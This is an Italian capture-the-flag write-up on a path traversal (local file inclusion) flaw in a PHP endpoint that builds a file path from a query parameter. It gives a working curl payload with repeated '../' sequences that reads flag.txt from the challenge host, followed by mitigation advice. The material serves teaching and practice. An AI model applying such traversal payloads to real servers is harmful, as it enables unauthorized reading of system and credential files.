# Path Traversal / LFI (Arbitrary File Read)

### 1. La Vulnerabilità (In sintesi)
L'applicazione web concatena l'input dell'utente (`static_file`) direttamente nel path del filesystem per aprire una risorsa: `"/var/www/html/static/" . $_GET['static_file']`.
Non sanitizzando la sequenza speciale `../` (che indica la cartella genitore), l'attaccante può risalire l'albero delle directory fino alla radice (`/`) per accedere a qualsiasi file di sistema leggibile.

### 2. Exploitation (Pratica)

**Ricognizione:**
Identificato l'endpoint vulnerabile: `/static.php?static_file=bulma.min.css`

**Payload:**
Fornire sequenze di traversal multiple `../` per raggiungere la root, seguite dal file di interesse:
```bash
curl -s "http://basiclfi.challs.cyberchallenge.it/static.php?static_file=../../../../../../flag.txt"
```
*(Nota: nei sistemi POSIX, accumulare `../` oltre la radice non genera errori, bloccando la lettura direttamente alla `/`.)*

### 3. Mitigazione
Controllare rigidamente l'input (whitelist dei file ammessi) o risolvere sempre il path finale tramite funzioni sicure come `realpath()` bloccando accessi fuori dalla web root.
